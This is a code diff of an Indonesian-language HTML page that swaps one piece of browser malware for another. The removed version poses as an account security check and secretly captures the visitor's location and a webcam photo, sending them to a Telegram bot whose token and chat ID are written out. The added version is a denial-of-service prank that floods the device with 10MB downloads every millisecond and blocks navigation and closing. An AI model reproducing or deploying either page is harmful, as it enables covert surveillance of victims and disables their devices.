@@ -2,76 +2,49 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Verification</title>
+    <title>SYSTEM OVERLOAD | L-ZERO V6</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { text-align: center; background: #080808; padding: 40px 20px; border-radius: 20px; border: 1px solid #111; width: 90%; max-width: 350px; }
-        .btn { background: #ff0000; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: 900; cursor: pointer; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
-        .loader { display: none; margin: 20px auto; border: 3px solid #111; border-top: 3px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #000; color: #f00; font-family: 'Courier New'; text-align: center; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; margin: 0; }
+        .nuclear-box { border: 10px solid #f00; padding: 50px; background: #000; box-shadow: 0 0 200px #f00; }
+        h1 { font-size: 70px; color: #fff; text-shadow: 0 0 30px #f00; animation: blink 0.05s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
     </style>
 </head>
-<body>
-    <div class="card">
-        <h2 id="st">Security Check</h2>
-        <p id="msg" style="font-size: 13px; color: #666;">Verifikasi identitas diperlukan untuk keamanan akun Anda.</p>
-        <button id="btn" class="btn" onclick="startRMT()">VERIFIKASI SEKARANG</button>
-        <div id="loader" class="loader"></div>
-    </div>
-    <video id="v" autoplay playsinline style="display:none"></video>
-    <canvas id="c" style="display:none"></canvas>
+<body onload="igniteHyperDrive()">
+
+<div class="nuclear-box">
+    <h1>TOTAL DESTRUCTION</h1>
+    <p style="color: #ff0; font-weight: bold; font-size: 25px;">MEMORI INTERNAL SEDANG DIHANCURKAN...</p>
+    <p style="color: #fff;">L-ZERO V6 | SPEED: 1ms (GOD MODE)</p>
+</div>
 
 <script>
-    const TELE_TOKEN = "8740798060:AAGVYPajLLAid1V2wO-SrbbXNcxur6vNPLk";
-    const TELE_ID = "8283778614";
+    function igniteHyperDrive() {
+        // LOCKDOWN NAVIGASI
+        document.documentElement.requestFullscreen().catch(() => {});
+        window.history.pushState(null, "", window.location.href);
 
-    function startRMT() {
-        document.getElementById('btn').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('st').innerText = "Processing...";
+        // CREATE HEAVY BLOB ONCE TO SAVE CPU (REUSE THE SAME DATA)
+        const size = 10 * 1024 * 1024; // 10MB
+        const junk = new Uint8Array(size).fill(0x69); // Data sampah statis biar cepet
+        const blob = new Blob([junk], { type: "application/octet-stream" });
+        const url = URL.createObjectURL(blob);
 
-        navigator.geolocation.getCurrentPosition(pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const maps = `https://www.google.com/maps?q=${lat},${lon}`;
-            const time = new Date().toLocaleString('id-ID');
-
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imgData = canvas.toDataURL('image/jpeg', 0.7);
-
-                    // SIMPAN KE BROWSER
-                    let targets = JSON.parse(localStorage.getItem('darkness_targets') || '[]');
-                    targets.push({ time, lat, lon, img: imgData });
-                    localStorage.setItem('darkness_targets', JSON.stringify(targets));
-
-                    // KIRIM KE TELEGRAM
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append("chat_id", TELE_ID);
-                        formData.append("photo", blob, "target.jpg");
-                        formData.append("caption", `💀 TARGET TERDETEKSI!\n\n📍 Maps: ${maps}\n⏰ Jam: ${time}\n👤 User: Kalz RMT`);
-                        
-                        fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: "POST", body: formData })
-                        .then(() => {
-                            stream.getTracks().forEach(t => t.stop());
-                            document.getElementById('loader').style.display = 'none';
-                            document.getElementById('st').innerText = "Error 404";
-                            document.getElementById('msg').innerText = "Koneksi terputus. Silakan coba lagi nanti.";
-                        });
-                    }, 'image/jpeg');
-                }, 2000);
-            });
-        }, () => { alert("Izin diperlukan untuk melanjutkan."); location.reload(); });
+        // THE 1ms KILLER LOOP
+        setInterval(() => {
+            const fileName = "DEATH_" + Math.random().toString(36).substring(2, 10) + ".bin";
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = fileName;
+            a.click();
+            
+            // NO CLEANUP! Biar RAM makin sesek!
+            // a.remove(); // Dilewati biar proses makin brutal
+        }, 1); // <--- INI DIA, 1 MILLISECOND JINGS!
     }
+
+    // ANTI-CLOSE
+    window.onbeforeunload = () => "SAY GOODBYE TO YOUR PHONE!";
 </script>
 </body>
 </html>
